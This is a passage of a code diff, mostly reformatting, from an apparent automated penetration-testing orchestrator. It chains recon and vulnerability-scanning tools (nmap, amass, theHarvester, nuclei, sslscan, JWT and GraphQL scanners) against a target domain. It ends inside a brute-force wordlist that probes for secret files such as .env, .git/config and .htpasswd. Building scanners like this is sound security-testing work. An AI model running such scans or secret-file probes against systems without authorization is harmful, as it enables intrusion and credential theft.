@@ -2654,22 +2792,29 @@ class Orchestrator:
                 self._log_tool(f"assetfinder - {len(subs)} assets", "done", tool_elapsed)
             else:
                 errors.append(f"assetfinder failed: {output[:100] if output else 'unknown error'}")
-                self._log_tool("assetfinder", "error", tool_elapsed, output[:100] if output else "command failed")
+                self._log_tool(
+                    "assetfinder",
+                    "error",
+                    tool_elapsed,
+                    output[:100] if output else "command failed",
+                )
 
         # Deduplicate subdomains
         self.subdomains = list(set(self.subdomains))
         all_subs_file = self.output_dir / f"all_subs_{self.domain}.txt"
         all_subs_file.write_text("\n".join(self.subdomains))
 
-        findings.append(Finding(
-            type="subdomain_count",
-            value=str(len(self.subdomains)),
-            description=f"Discovered {len(self.subdomains)} unique subdomains",
-            severity="info",
-            phase="recon",
-            tool="subdomain_enum",
-            target=self.domain
-        ))
+        findings.append(
+            Finding(
+                type="subdomain_count",
+                value=str(len(self.subdomains)),
+                description=f"Discovered {len(self.subdomains)} unique subdomains",
+                severity="info",
+                phase="recon",
+                tool="subdomain_enum",
+                target=self.domain,
+            )
+        )
 
         # 2. Live Host Detection with HTTPX
         if "httpx" in self.config.recon_tools and self.subdomains:
@@ -2678,7 +2823,7 @@ class Orchestrator:
 
             ret, output = await self._run_command(
                 f"echo '{subs_input}' | httpx -silent -status-code -title -tech-detect -json 2>/dev/null",
-                timeout=180
+                timeout=180,
             )
             if ret == 0:
                 httpx_file = self.output_dir / "httpx_results.json"
@@ -2698,23 +2843,24 @@ class Orchestrator:
                 tools_run.append("httpx")
                 self._log_tool(f"httpx - {len(self.live_hosts)} live hosts", "done")
 
-                findings.append(Finding(
-                    type="live_hosts",
-                    value=str(len(self.live_hosts)),
-                    description=f"Found {len(self.live_hosts)} live hosts",
-                    severity="info",
-                    phase="recon",
-                    tool="httpx",
-                    target=self.domain
-                ))
+                findings.append(
+                    Finding(
+                        type="live_hosts",
+                        value=str(len(self.live_hosts)),
+                        description=f"Found {len(self.live_hosts)} live hosts",
+                        severity="info",
+                        phase="recon",
+                        tool="httpx",
+                        target=self.domain,
+                    )
+                )
 
         # 3. Port Scanning with Nmap
         if "nmap" in self.config.recon_tools:
             self._log_tool("nmap", "running")
             # Security: Use safe_domain to prevent command injection
             ret, output = await self._run_command(
-                f"nmap -sV --top-ports 100 {self.safe_domain} 2>/dev/null",
-                timeout=300
+                f"nmap -sV --top-ports 100 {self.safe_domain} 2>/dev/null", timeout=300
             )
             if ret == 0:
                 (self.output_dir / f"nmap_{self.domain}.txt").write_text(output)
@@ -2729,15 +2875,17 @@ class Orchestrator:
                             service = parts[2] if len(parts) > 2 else "unknown"
                             port_str = f"{port} ({service})"
                             self.open_ports.append(port_str)
-                            findings.append(Finding(
-                                type="open_port",
-                                value=port,
-                                description=f"Port {port} open running {service}",
-                                severity="info",
-                                phase="recon",
-                                tool="nmap",
-                                target=self.domain
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="open_port",
+                                    value=port,
+                                    description=f"Port {port} open running {service}",
+                                    severity="info",
+                                    phase="recon",
+                                    tool="nmap",
+                                    target=self.domain,
+                                )
+                            )
 
                 self._log_tool("nmap - completed", "done")
 
@@ -2760,9 +2908,10 @@ class Orchestrator:
                 self._log_tool("waybackurls (API fallback)", "running")
                 try:
                     import urllib.request
+
                     api_url = f"https://web.archive.org/cdx/search/cdx?url=*.{self.safe_domain}/*&output=text&fl=original&collapse=urlkey&limit=5000"
                     with urllib.request.urlopen(api_url, timeout=30) as response:
-                        api_output = response.read().decode('utf-8')
+                        api_output = response.read().decode("utf-8")
                         wayback_urls = [u for u in api_output.split("\n") if u.strip()]
                 except Exception as api_error:
                     logger.debug(f"Wayback API fallback failed: {api_error}")
@@ -2775,7 +2924,9 @@ class Orchestrator:
                 self._log_tool(f"waybackurls - {len(wayback_urls)} URLs", "done", tool_elapsed)
             else:
                 # Write empty file with explanation
-                wayback_file.write_text(f"# No wayback URLs found for {self.domain}\n# Tool: waybackurls or Wayback Machine API\n")
+                wayback_file.write_text(
+                    f"# No wayback URLs found for {self.domain}\n# Tool: waybackurls or Wayback Machine API\n"
+                )
                 self._log_tool("waybackurls - no URLs found", "done", tool_elapsed)
 
         # 5. Amass - Advanced Subdomain Enumeration (NEW)
@@ -2785,7 +2936,7 @@ class Orchestrator:
             # Use -silent to suppress progress bars, -nocolor to avoid ANSI codes
             ret, output = await self._run_command(
                 f"amass enum -passive -silent -nocolor -d {self.safe_domain} -timeout 5 2>/dev/null",
-                timeout=360
+                timeout=360,
             )
             tool_elapsed = time.time() - tool_start
 
@@ -2802,19 +2953,23 @@ class Orchestrator:
 
                 # Add amass subdomains as info findings
                 if len(subs) > 0:
-                    findings.append(Finding(
-                        type="subdomain_discovery",
-                        value=f"{len(subs)} subdomains via amass",
-                        description=f"Amass discovered {len(subs)} subdomains for {self.domain}",
-                        severity="info",
-                        phase="recon",
-                        tool="amass",
-                        target=self.domain,
-                        metadata={"subdomains": subs[:50]}  # Store first 50
-                    ))
+                    findings.append(
+                        Finding(
+                            type="subdomain_discovery",
+                            value=f"{len(subs)} subdomains via amass",
+                            description=f"Amass discovered {len(subs)} subdomains for {self.domain}",
+                            severity="info",
+                            phase="recon",
+                            tool="amass",
+                            target=self.domain,
+                            metadata={"subdomains": subs[:50]},  # Store first 50
+                        )
+                    )
             elif ret != 0:
                 errors.append(f"amass failed: {output[:100] if output else 'unknown error'}")
-                self._log_tool("amass", "error", tool_elapsed, output[:100] if output else "command failed")
+                self._log_tool(
+                    "amass", "error", tool_elapsed, output[:100] if output else "command failed"
+                )
             else:
                 self._log_tool("amass - no subdomains found", "done", tool_elapsed)
 
@@ -2822,8 +2977,7 @@ class Orchestrator:
         if "theHarvester" in self.config.recon_tools:
             self._log_tool("theHarvester", "running")
             ret, output = await self._run_command(
-                f"theHarvester -d {self.safe_domain} -b all -l 100 2>/dev/null",
-                timeout=300
+                f"theHarvester -d {self.safe_domain} -b all -l 100 2>/dev/null", timeout=300
             )
             if ret == 0:
                 (self.output_dir / f"theharvester_{self.domain}.txt").write_text(output)
@@ -2833,16 +2987,18 @@ class Orchestrator:
                     if "@" in line and self.domain in line:
                         emails.append(line.strip())
                 if emails:
-                    findings.append(Finding(
-                        type="email_discovered",
-                        value=str(len(emails)),
-                        description=f"Discovered {len(emails)} email addresses",
-                        severity="info",
-                        phase="recon",
-                        tool="theHarvester",
-                        target=self.domain,
-                        metadata={"emails": emails[:20]}  # Store first 20
-                    ))
+                    findings.append(
+                        Finding(
+                            type="email_discovered",
+                            value=str(len(emails)),
+                            description=f"Discovered {len(emails)} email addresses",
+                            severity="info",
+                            phase="recon",
+                            tool="theHarvester",
+                            target=self.domain,
+                            metadata={"emails": emails[:20]},  # Store first 20
+                        )
+                    )
                 tools_run.append("theHarvester")
                 self._log_tool(f"theHarvester - {len(emails)} emails", "done")
 
@@ -2851,29 +3007,29 @@ class Orchestrator:
             self._log_tool("dnsrecon", "running")
             ret, output = await self._run_command(
                 f"dnsrecon -d {self.safe_domain} -t std,brt -j {self.output_dir}/dnsrecon_{self.domain}.json 2>/dev/null",
-                timeout=180
+                timeout=180,
             )
             if ret == 0:
                 tools_run.append("dnsrecon")
                 # Check for zone transfer vulnerability
                 if "Zone Transfer" in output and "Success" in output:
-                    findings.append(Finding(
-                        type="dns_zone_transfer",
-                        value="Zone transfer allowed",
-                        description="DNS zone transfer is allowed - critical information disclosure",
-                        severity="high",
-                        phase="recon",
-                        tool="dnsrecon",
-                        target=self.domain
-                    ))
+                    findings.append(
+                        Finding(
+                            type="dns_zone_transfer",
+                            value="Zone transfer allowed",
+                            description="DNS zone transfer is allowed - critical information disclosure",
+                            severity="high",
+                            phase="recon",
+                            tool="dnsrecon",
+                            target=self.domain,
+                        )
+                    )
                 self._log_tool("dnsrecon - completed", "done")
 
         # 8. wafw00f - WAF Fingerprinting (NEW)
         if "wafw00f" in self.config.recon_tools:
             self._log_tool("wafw00f", "running")
-            ret, output = await self._run_command(
-                f"wafw00f {self.safe_target} 2>/dev/null"
-            )
+            ret, output = await self._run_command(f"wafw00f {self.safe_target} 2>/dev/null")
             if ret == 0:
                 (self.output_dir / f"wafw00f_{self.domain}.txt").write_text(output)
                 # Parse WAF detection
@@ -2886,27 +3042,33 @@ class Orchestrator:
                             if len(parts) > 1:
                                 waf_name = parts[1].strip().split()[0]
                                 break
-                    findings.append(Finding(
-                        type="waf_detected",
-                        value=waf_name,
-                        description=f"Web Application Firewall detected: {waf_name}",
-                        severity="info",
-                        phase="recon",
-                        tool="wafw00f",
-                        target=self.target
-                    ))
+                    findings.append(
+                        Finding(
+                            type="waf_detected",
+                            value=waf_name,
+                            description=f"Web Application Firewall detected: {waf_name}",
+                            severity="info",
+                            phase="recon",
+                            tool="wafw00f",
+                            target=self.target,
+                        )
+                    )
                 elif "No WAF" in output:
-                    findings.append(Finding(
-                        type="no_waf",
-                        value="No WAF detected",
-                        description="No Web Application Firewall detected - target may be more vulnerable",
-                        severity="low",
-                        phase="recon",
-                        tool="wafw00f",
-                        target=self.target
-                    ))
+                    findings.append(
+                        Finding(
+                            type="no_waf",
+                            value="No WAF detected",
+                            description="No Web Application Firewall detected - target may be more vulnerable",
+                            severity="low",
+                            phase="recon",
+                            tool="wafw00f",
+                            target=self.target,
+                        )
+                    )
                 tools_run.append("wafw00f")
-                self._log_tool(f"wafw00f - {waf_name if 'is behind' in output else 'No WAF'}", "done")
+                self._log_tool(
+                    f"wafw00f - {waf_name if 'is behind' in output else 'No WAF'}", "done"
+                )
 
         # 9. whatweb - Technology Fingerprinting (NEW)
         if "whatweb" in self.config.recon_tools:
@@ -2971,45 +3133,55 @@ class Orchestrator:
 
                 # Create findings for discovered APIs
                 for spec_url in api_result.swagger_specs:
-                    findings.append(Finding(
-                        type="api_spec_exposed",
-                        value=f"OpenAPI/Swagger specification exposed",
-                        description=f"API documentation found at {spec_url}. May reveal sensitive endpoints.",
-                        severity="medium",
-                        phase="recon",
-                        tool="api-discovery",
-                        target=spec_url,
-                    ))
+                    findings.append(
+                        Finding(
+                            type="api_spec_exposed",
+                            value="OpenAPI/Swagger specification exposed",
+                            description=f"API documentation found at {spec_url}. May reveal sensitive endpoints.",
+                            severity="medium",
+                            phase="recon",
+                            tool="api-discovery",
+                            target=spec_url,
+                        )
+                    )
 
                 for gql_url in api_result.graphql_endpoints:
-                    findings.append(Finding(
-                        type="graphql_exposed",
-                        value=f"GraphQL endpoint discovered",
-                        description=f"GraphQL endpoint at {gql_url}. Test for introspection and injection.",
-                        severity="medium",
-                        phase="recon",
-                        tool="api-discovery",
-                        target=gql_url,
-                    ))
+                    findings.append(
+                        Finding(
+                            type="graphql_exposed",
+                            value="GraphQL endpoint discovered",
+                            description=f"GraphQL endpoint at {gql_url}. Test for introspection and injection.",
+                            severity="medium",
+                            phase="recon",
+                            tool="api-discovery",
+                            target=gql_url,
+                        )
+                    )
 
                 # Log unauthenticated endpoints (potential auth bypass)
-                unauth_endpoints = [ep for ep in api_result.endpoints if not ep.auth_required and ep.status_code == 200]
+                unauth_endpoints = [
+                    ep
+                    for ep in api_result.endpoints
+                    if not ep.auth_required and ep.status_code == 200
+                ]
                 if unauth_endpoints:
-                    findings.append(Finding(
-                        type="unauthenticated_api",
-                        value=f"{len(unauth_endpoints)} API endpoints accessible without auth",
-                        description=f"Found {len(unauth_endpoints)} API endpoints that return 200 without authentication.",
-                        severity="low",
-                        phase="recon",
-                        tool="api-discovery",
-                        target=self.target,
-                        metadata={"endpoints": [ep.url for ep in unauth_endpoints[:10]]},
-                    ))
+                    findings.append(
+                        Finding(
+                            type="unauthenticated_api",
+                            value=f"{len(unauth_endpoints)} API endpoints accessible without auth",
+                            description=f"Found {len(unauth_endpoints)} API endpoints that return 200 without authentication.",
+                            severity="low",
+                            phase="recon",
+                            tool="api-discovery",
+                            target=self.target,
+                            metadata={"endpoints": [ep.url for ep in unauth_endpoints[:10]]},
+                        )
+                    )
 
                 self._log_tool(
                     f"api-discovery - {len(api_result.endpoints)} endpoints, "
                     f"{len(api_result.swagger_specs)} specs, {len(api_result.graphql_endpoints)} GraphQL",
-                    "done"
+                    "done",
                 )
             else:
                 self._log_tool("api-discovery - no APIs found", "done")
@@ -3039,8 +3211,8 @@ class Orchestrator:
             errors=errors,
             metadata={
                 "subdomains_count": len(self.subdomains),
-                "live_hosts_count": len(self.live_hosts)
-            }
+                "live_hosts_count": len(self.live_hosts),
+            },
         )
 
         self.phase_results[phase] = result
@@ -3112,21 +3284,23 @@ class Orchestrator:
                 f"webcrawler - {len(self.discovered_endpoints)} endpoints, "
                 f"{len(self.discovered_forms)} forms, "
                 f"{len(self.discovered_parameters)} parameters",
-                "done"
+                "done",
             )
 
             # Add forms and parameters as findings for analysis
             for form in self.discovered_forms:
-                findings.append(Finding(
-                    type="form",
-                    value=f"Form: {form.get('action', 'unknown')}",
-                    description=f"Discovered form with method {form.get('method', 'GET')} - {len(form.get('inputs', []))} inputs",
-                    severity="info",
-                    phase="scan",
-                    tool="webcrawler",
-                    target=form.get('page', self.target),
-                    metadata=form
-                ))
+                findings.append(
+                    Finding(
+                        type="form",
+                        value=f"Form: {form.get('action', 'unknown')}",
+                        description=f"Discovered form with method {form.get('method', 'GET')} - {len(form.get('inputs', []))} inputs",
+                        severity="info",
+                        phase="scan",
+                        tool="webcrawler",
+                        target=form.get("page", self.target),
+                        metadata=form,
+                    )
+                )
 
         except Exception as e:
             errors.append(f"WebCrawler: {str(e)}")
@@ -3141,7 +3315,9 @@ class Orchestrator:
             auth_header_args = self._get_auth_header_args(auth_headers)
 
             # Use JSON output for reliable parsing, exclude info level for cleaner results
-            nuclei_cmd = f"nuclei -u {self.safe_target} -severity low,medium,high,critical -json -silent"
+            nuclei_cmd = (
+                f"nuclei -u {self.safe_target} -severity low,medium,high,critical -json -silent"
+            )
             if auth_header_args:
                 nuclei_cmd += f" {auth_header_args}"
             nuclei_cmd += " 2>/dev/null"
@@ -3167,59 +3343,75 @@ class Orchestrator:
                         description = vuln.get("info", {}).get("description", name)
 
                         # Skip informational findings unless they're actually interesting
-                        if severity == "info" and "exposure" not in name.lower() and "disclosure" not in name.lower():
+                        if (
+                            severity == "info"
+                            and "exposure" not in name.lower()
+                            and "disclosure" not in name.lower()
+                        ):
                             continue
 
                         nuclei_count += 1
-                        findings.append(Finding(
-                            type="vulnerability",
-                            value=name,
-                            description=description[:500] if description else name,
-                            severity=severity if severity in ["critical", "high", "medium", "low"] else "low",
-                            phase="scan",
-                            tool="nuclei",
-                            target=matched_at,
-                            metadata={
+                        findings.append(
+                            Finding(
+                                type="vulnerability",
+                                value=name,
+                                description=description[:500] if description else name,
+                                severity=(
+                                    severity
+                                    if severity in ["critical", "high", "medium", "low"]
+                                    else "low"
+                                ),
+                                phase="scan",
+                                tool="nuclei",
+                                target=matched_at,
+                                metadata={
+                                    "template_id": template_id,
+                                    "matcher_name": vuln.get("matcher-name", ""),
+                                    "curl_command": vuln.get("curl-command", ""),
+                                    "reference": vuln.get("info", {}).get("reference", []),
+                                    "tags": vuln.get("info", {}).get("tags", []),
+                                },
+                            )
+                        )
+                        # Collect for JSON output
+                        nuclei_findings.append(
+                            {
                                 "template_id": template_id,
+                                "name": name,
+                                "severity": severity,
+                                "description": description[:500] if description else "",
+                                "matched_at": matched_at,
                                 "matcher_name": vuln.get("matcher-name", ""),
-                                "curl_command": vuln.get("curl-command", ""),
                                 "reference": vuln.get("info", {}).get("reference", []),
                                 "tags": vuln.get("info", {}).get("tags", []),
+                                "curl_command": vuln.get("curl-command", ""),
                             }
-                        ))
-                        # Collect for JSON output
-                        nuclei_findings.append({
-                            "template_id": template_id,
-                            "name": name,
-                            "severity": severity,
-                            "description": description[:500] if description else "",
-                            "matched_at": matched_at,
-                            "matcher_name": vuln.get("matcher-name", ""),
-                            "reference": vuln.get("info", {}).get("reference", []),
-                            "tags": vuln.get("info", {}).get("tags", []),
-                            "curl_command": vuln.get("curl-command", ""),
-                        })
+                        )
                     except json.JSONDecodeError:
                         # Fallback to text parsing for non-JSON output
                         if line and "[" in line:
                             parts = line.split()
                             if len(parts) >= 2:
                                 sev = self._parse_nuclei_severity(line)
-                                findings.append(Finding(
-                                    type="vulnerability",
-                                    value=parts[0].strip("[]") if parts else line,
-                                    description=line,
-                                    severity=sev,
-                                    phase="scan",
-                                    tool="nuclei",
-                                    target=self.domain
-                                ))
-                                nuclei_findings.append({
-                                    "name": parts[0].strip("[]") if parts else line,
-                                    "severity": sev,
-                                    "description": line,
-                                    "matched_at": self.target
-                                })
+                                findings.append(
+                                    Finding(
+                                        type="vulnerability",
+                                        value=parts[0].strip("[]") if parts else line,
+                                        description=line,
+                                        severity=sev,
+                                        phase="scan",
+                                        tool="nuclei",
+                                        target=self.domain,
+                                    )
+                                )
+                                nuclei_findings.append(
+                                    {
+                                        "name": parts[0].strip("[]") if parts else line,
+                                        "severity": sev,
+                                        "description": line,
+                                        "matched_at": self.target,
+                                    }
+                                )
                                 nuclei_count += 1
 
                 # Save structured nuclei JSON
@@ -3228,7 +3420,7 @@ class Orchestrator:
                     "target": self.target,
                     "scan_type": "nuclei",
                     "finding_count": nuclei_count,
-                    "findings": nuclei_findings
+                    "findings": nuclei_findings,
                 }
                 nuclei_json_path.write_text(json.dumps(nuclei_data, indent=2))
 
@@ -3242,7 +3434,7 @@ class Orchestrator:
             jwt_tokens_to_analyze.append(self.config.auth_credentials.token)
 
         # Also look for JWT patterns in discovered endpoints/responses
-        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
+        jwt_pattern = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
 
         if jwt_tokens_to_analyze:
             self._log_tool("jwt-analyzer", "running")
@@ -3256,28 +3448,32 @@ class Orchestrator:
 
                         for jf in jwt_results:
                             jwt_findings_count += 1
-                            findings.append(Finding(
-                                type="jwt_vulnerability",
-                                value=jf.vulnerability,
-                                description=jf.description,
-                                severity=jf.severity,
-                                phase="scan",
-                                tool="jwt-analyzer",
-                                target=self.target,
-                                metadata={
-                                    "evidence": jf.evidence[:200] if jf.evidence else "",
-                                    "remediation": jf.remediation,
-                                    "affected_claim": jf.affected_claim,
-                                    "attack_vector": jf.attack_vector,
-                                    "cwe": jf.cwe,
-                                }
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="jwt_vulnerability",
+                                    value=jf.vulnerability,
+                                    description=jf.description,
+                                    severity=jf.severity,
+                                    phase="scan",
+                                    tool="jwt-analyzer",
+                                    target=self.target,
+                                    metadata={
+                                        "evidence": jf.evidence[:200] if jf.evidence else "",
+                                        "remediation": jf.remediation,
+                                        "affected_claim": jf.affected_claim,
+                                        "attack_vector": jf.attack_vector,
+                                        "cwe": jf.cwe,
+                                    },
+                                )
+                            )
                     except Exception as e:
                         logger.debug(f"JWT analysis error: {e}")
 
                 if jwt_findings_count > 0:
                     tools_run.append("jwt-analyzer")
-                    self._log_tool(f"jwt-analyzer - {jwt_findings_count} vulnerabilities found!", "done")
+                    self._log_tool(
+                        f"jwt-analyzer - {jwt_findings_count} vulnerabilities found!", "done"
+                    )
                 else:
                     self._log_tool("jwt-analyzer - no vulnerabilities found", "done")
 
@@ -3290,11 +3486,11 @@ class Orchestrator:
 
         # 1.6 GraphQL Security Scanning - Test discovered GraphQL endpoints
         # Check if API Discovery found any GraphQL endpoints (stored during RECON)
-        graphql_endpoints = getattr(self, '_graphql_endpoints', [])
+        graphql_endpoints = getattr(self, "_graphql_endpoints", [])
 
         # Also look for GraphQL in discovered endpoints
         for endpoint in self.discovered_endpoints:
-            if any(gql in endpoint.lower() for gql in ['graphql', 'graphiql', '/gql', '/query']):
+            if any(gql in endpoint.lower() for gql in ["graphql", "graphiql", "/gql", "/query"]):
                 if endpoint not in graphql_endpoints:
                     graphql_endpoints.append(endpoint)
 
@@ -3324,20 +3520,22 @@ class Orchestrator:
 
                         for gf in result.findings:
                             graphql_findings_count += 1
-                            findings.append(Finding(
-                                type="graphql_vulnerability",
-                                value=gf.vulnerability,
-                                description=gf.description,
-                                severity=gf.severity,
-                                phase="scan",
-                                tool="graphql-scanner",
-                                target=gf.endpoint,
-                                metadata={
-                                    "evidence": gf.evidence[:300] if gf.evidence else "",
-                                    "remediation": gf.remediation,
-                                    "cwe": gf.cwe,
-                                }
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="graphql_vulnerability",
+                                    value=gf.vulnerability,
+                                    description=gf.description,
+                                    severity=gf.severity,
+                                    phase="scan",
+                                    tool="graphql-scanner",
+                                    target=gf.endpoint,
+                                    metadata={
+                                        "evidence": gf.evidence[:300] if gf.evidence else "",
+                                        "remediation": gf.remediation,
+                                        "cwe": gf.cwe,
+                                    },
+                                )
+                            )
 
                         # Save schema info if discovered
                         if result.schema_info:
@@ -3349,7 +3547,9 @@ class Orchestrator:
                     logger.debug(f"GraphQL scan error for {gql_endpoint}: {e}")
 
             if graphql_findings_count > 0:
-                self._log_tool(f"graphql-scanner - {graphql_findings_count} vulnerabilities!", "done")
+                self._log_tool(
+                    f"graphql-scanner - {graphql_findings_count} vulnerabilities!", "done"
+                )
             else:
                 self._log_tool("graphql-scanner - no vulnerabilities found", "done")
         else:
@@ -3375,63 +3575,75 @@ class Orchestrator:
                 output_lower = output.lower()
 
                 # Check for weak ciphers
-                if "accepted" in output_lower and ("rc4" in output_lower or "des" in output_lower or "null" in output_lower):
-                    findings.append(Finding(
-                        type="weak_cipher",
-                        value="Weak TLS ciphers detected",
-                        description="Server accepts weak cryptographic ciphers (RC4/DES/NULL)",
-                        severity="medium",
-                        phase="scan",
-                        tool="sslscan",
-                        target=self.domain
-                    ))
+                if "accepted" in output_lower and (
+                    "rc4" in output_lower or "des" in output_lower or "null" in output_lower
+                ):
+                    findings.append(
+                        Finding(
+                            type="weak_cipher",
+                            value="Weak TLS ciphers detected",
+                            description="Server accepts weak cryptographic ciphers (RC4/DES/NULL)",
+                            severity="medium",
+                            phase="scan",
+                            tool="sslscan",
+                            target=self.domain,
+                        )
+                    )
 
                 # Check for SSLv3/TLSv1.0 enabled
                 if "sslv3" in output_lower and "enabled" in output_lower:
-                    findings.append(Finding(
-                        type="weak_protocol",
-                        value="SSLv3 enabled",
-                        description="SSLv3 protocol enabled - vulnerable to POODLE attack",
-                        severity="high",
-                        phase="scan",
-                        tool="sslscan",
-                        target=self.domain
-                    ))
+                    findings.append(
+                        Finding(
+                            type="weak_protocol",
+                            value="SSLv3 enabled",
+                            description="SSLv3 protocol enabled - vulnerable to POODLE attack",
+                            severity="high",
+                            phase="scan",
+                            tool="sslscan",
+                            target=self.domain,
+                        )
+                    )
 
                 if "tlsv1.0" in output_lower and "enabled" in output_lower:
-                    findings.append(Finding(
-                        type="weak_protocol",
-                        value="TLSv1.0 enabled",
-                        description="TLSv1.0 protocol enabled - deprecated and insecure",
-                        severity="medium",
-                        phase="scan",
-                        tool="sslscan",
-                        target=self.domain
-                    ))
+                    findings.append(
+                        Finding(
+                            type="weak_protocol",
+                            value="TLSv1.0 enabled",
+                            description="TLSv1.0 protocol enabled - deprecated and insecure",
+                            severity="medium",
+                            phase="scan",
+                            tool="sslscan",
+                            target=self.domain,
+                        )
+                    )
 
                 # Check for TLSv1.1 (deprecated since 2020)
                 if "tlsv1.1" in output_lower and "enabled" in output_lower:
-                    findings.append(Finding(
-                        type="weak_protocol",
-                        value="TLSv1.1 Enabled",
-                        description="TLSv1.1 protocol enabled - deprecated by major browsers since 2020, should be disabled",
-                        severity="medium",
-                        phase="scan",
-                        tool="sslscan",
-                        target=self.domain
-                    ))
+                    findings.append(
+                        Finding(
+                            type="weak_protocol",
+                            value="TLSv1.1 Enabled",
+                            description="TLSv1.1 protocol enabled - deprecated by major browsers since 2020, should be disabled",
+                            severity="medium",
+                            phase="scan",
+                            tool="sslscan",
+                            target=self.domain,
+                        )
+                    )
 
                 # Check for Heartbleed
                 if "vulnerable" in output_lower and "heartbleed" in output_lower:
-                    findings.append(Finding(
-                        type="vulnerability",
-                        value="Heartbleed vulnerability",
-                        description="Server vulnerable to Heartbleed (CVE-2014-0160) - critical memory disclosure",
-                        severity="critical",
-                        phase="scan",
-                        tool="sslscan",
-                        target=self.domain
-                    ))
+                    findings.append(
+                        Finding(
+                            type="vulnerability",
+                            value="Heartbleed vulnerability",
+                            description="Server vulnerable to Heartbleed (CVE-2014-0160) - critical memory disclosure",
+                            severity="critical",
+                            phase="scan",
+                            tool="sslscan",
+                            target=self.domain,
+                        )
+                    )
 
                 ssl_findings_list = [f for f in findings if f.tool == "sslscan"]
                 ssl_findings_count = len(ssl_findings_list)
@@ -3451,10 +3663,10 @@ class Orchestrator:
                             "description": f.description,
                             "severity": f.severity,
                             "tool": f.tool,
-                            "target": f.target
+                            "target": f.target,
                         }
                         for f in ssl_findings_list
-                    ]
+                    ],
                 }
                 sslscan_json_path.write_text(json.dumps(sslscan_json_data, indent=2))
 
@@ -3482,7 +3694,7 @@ class Orchestrator:
                     "status": "failed",
                     "error": error_msg,
                     "finding_count": 0,
-                    "findings": []
+                    "findings": [],
                 }
                 sslscan_json_path.write_text(json.dumps(sslscan_json_data, indent=2))
                 errors.append(f"sslscan: {error_msg}")
@@ -3527,71 +3739,249 @@ class Orchestrator:
                 fallback_wordlist = self.output_dir / "wordlist_common.txt"
                 fallback_words = [
                     # Common directories
-                    "admin", "administrator", "api", "app", "application", "assets",
-                    "backup", "backups", "bin", "cache", "cgi-bin", "config", "console",
-                    "css", "dashboard", "data", "database", "db", "debug", "dev",
-                    "docs", "downloads", "error", "files", "fonts", "home", "html",
-                    "images", "img", "includes", "install", "js", "lib", "log", "login",
-                    "logs", "mail", "media", "old", "panel", "php", "phpmyadmin",
-                    "private", "public", "robots.txt", "scripts", "server", "server-status",
-                    "setup", "shell", "sitemap.xml", "src", "static", "stats", "status",
-                    "storage", "system", "temp", "test", "tmp", "upload", "uploads",
-                    "user", "users", "var", "vendor", "web", "webmail", "wp-admin",
-                    "wp-content", "wp-includes", "wp-login.php", "xmlrpc.php",
+                    "admin",
+                    "administrator",
+                    "api",
+                    "app",
+                    "application",
+                    "assets",
+                    "backup",
+                    "backups",
+                    "bin",
+                    "cache",
+                    "cgi-bin",
+                    "config",
+                    "console",
+                    "css",
+                    "dashboard",
+                    "data",
+                    "database",
+                    "db",
+                    "debug",
+                    "dev",
+                    "docs",
+                    "downloads",
+                    "error",
+                    "files",
+                    "fonts",
+                    "home",
+                    "html",
+                    "images",
+                    "img",
+                    "includes",
+                    "install",
+                    "js",
+                    "lib",
+                    "log",
+                    "login",
+                    "logs",
+                    "mail",
+                    "media",
+                    "old",
+                    "panel",
+                    "php",
+                    "phpmyadmin",
+                    "private",
+                    "public",
+                    "robots.txt",
+                    "scripts",
+                    "server",
+                    "server-status",
+                    "setup",
+                    "shell",
+                    "sitemap.xml",
+                    "src",
+                    "static",
+                    "stats",
+                    "status",
+                    "storage",
+                    "system",
+                    "temp",
+                    "test",
+                    "tmp",
+                    "upload",
+                    "uploads",
+                    "user",
+                    "users",
+                    "var",
+                    "vendor",
+                    "web",
+                    "webmail",
+                    "wp-admin",
+                    "wp-content",
+                    "wp-includes",
+                    "wp-login.php",
+                    "xmlrpc.php",
                     # Sensitive environment/config files
-                    ".env", ".env.local", ".env.dev", ".env.prod", ".env.production",
-                    ".env.staging", ".env.backup", ".env.example", ".env.sample", ".env.old",
-                    ".env.bak", ".env.swp", ".env~", "env.js", "env.json",
+                    ".env",
+                    ".env.local",
+                    ".env.dev",
+                    ".env.prod",
+                    ".env.production",
+                    ".env.staging",
+                    ".env.backup",
+                    ".env.example",
+                    ".env.sample",
+                    ".env.old",
+                    ".env.bak",
+                    ".env.swp",
+                    ".env~",
+                    "env.js",
+                    "env.json",
                     # Git/SVN/Version control
-                    ".git", ".git/config", ".git/HEAD", ".gitignore", ".gitattributes",
-                    ".svn", ".svn/entries", ".hg", ".bzr",
+                    ".git",
+                    ".git/config",
+                    ".git/HEAD",
+                    ".gitignore",
+                    ".gitattributes",
+                    ".svn",
+                    ".svn/entries",
+                    ".hg",
+                    ".bzr",
                     # Swagger/OpenAPI/API docs
-                    "swagger", "swagger.json", "swagger.yaml", "swagger.yml",
-                    "swagger-ui", "swagger-ui.html", "swagger-resources",
-                    "api-docs", "api-docs.json", "openapi.json", "openapi.yaml",
-                    "v1/swagger.json", "v2/swagger.json", "v3/swagger.json",
-                    "api/swagger.json", "api/v1/swagger.json", "api/v2/swagger.json",
-                    "docs/api", "api/docs", "redoc", "graphql", "graphiql",
+                    "swagger",
+                    "swagger.json",
+                    "swagger.yaml",
+                    "swagger.yml",
+                    "swagger-ui",
+                    "swagger-ui.html",
+                    "swagger-resources",
+                    "api-docs",
+                    "api-docs.json",
+                    "openapi.json",
+                    "openapi.yaml",
+                    "v1/swagger.json",
+                    "v2/swagger.json",
+                    "v3/swagger.json",
+                    "api/swagger.json",
+                    "api/v1/swagger.json",
+                    "api/v2/swagger.json",
+                    "docs/api",
+                    "api/docs",
+                    "redoc",
+                    "graphql",
+                    "graphiql",
                     # Config files
-                    ".htaccess", ".htpasswd", "web.config", "config.php", "config.js",
-                    "config.json", "config.yaml", "config.yml", "settings.py",
-                    "settings.json", "application.yml", "application.properties",
-                    "appsettings.json", "appsettings.Development.json",
+                    ".htaccess",
+                    ".htpasswd",
+                    "web.config",
+                    "config.php",
+                    "config.js",
+                    "config.json",
+                    "config.yaml",
+                    "config.yml",
+                    "settings.py",
+                    "settings.json",
+                    "application.yml",
+                    "application.properties",
+                    "appsettings.json",
+                    "appsettings.Development.json",
                     # Backup files
-                    "backup.sql", "backup.zip", "backup.tar.gz", "backup.tar",
